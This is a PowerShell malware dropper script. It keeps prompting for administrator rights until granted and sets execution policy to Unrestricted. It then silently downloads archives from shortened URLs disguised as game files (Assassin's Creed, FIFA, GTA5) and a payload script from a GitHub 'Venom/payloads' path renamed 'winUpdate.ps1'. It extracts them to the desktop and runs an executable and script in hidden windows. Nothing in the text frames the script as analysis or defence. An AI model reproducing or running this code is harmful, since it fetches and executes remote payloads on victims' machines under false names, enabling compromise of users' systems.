
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {

    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit  
    }
}

Set-ExecutionPolicy Unrestricted -Force

Set-Variable -Name textPath -Value ("$env:TEMP")
Set-Variable -Name zipFilePath -Value ("$env:TEMP")
Set-Variable -Name zipUrl -Value ("http://tiny.cc/f7cg001")
Set-Variable -Name zipUrl_1 -Value ("http://tiny.cc/k7cg001")
Set-Variable -Name zipUrl_2 -Value ("http://tiny.cc/p7cg001")
Set-Variable -Name zipUrl_3 -Value ("http://tiny.cc/v7cg001")
Set-Variable -Name Url_1 -Value ("https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks3.ps1")
Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
function Test-IsAdmin {
    Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

Set-Content -Value "Permissions Granted" -Path "$textPath\perm.txt"

powershell -windowstyle hidden Invoke-WebRequest -UseBasicParsing -OutFile "$zipFilePath\AssassinsCreed_SE.zip" -Uri $zipUrl

powershell -Uri $zipUrl_1 Invoke-WebRequest -windowstyle hidden -UseBasicParsing -OutFile "$zipFilePath\Fifa-Ps5.zip"

powershell -Uri $zipUrl_2 Invoke-WebRequest -UseBasicParsing -OutFile "$zipFilePath\Gta5-Ps5.zip" -windowstyle hidden

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_3 -UseBasicParsing -OutFile "$zipFilePath\dumdum.zip"

powershell -Uri $Url_1 Invoke-WebRequest -windowstyle hidden -UseBasicParsing -OutFile "$zipFilePath\winUpdate.ps1"


Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath

Expand-Archive -DestinationPath $desktopPath -Path "$zipFilePath\Fifa-Ps5.zip" -Force

Expand-Archive -Force -Path "$zipFilePath\Gta5-Ps5.zip" -DestinationPath $desktopPath

Expand-Archive -Force -Path "$zipFilePath\dumdum.zip" -DestinationPath $desktopPath

Start-Sleep -Seconds 240

Start-Process -windowstyle hidden -FilePath "$desktopPath\dumdum.exe" 

Start-Process -windowstyle hidden -FilePath "$zipFilePath\winUpdate2.ps1"

exit 0

Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"

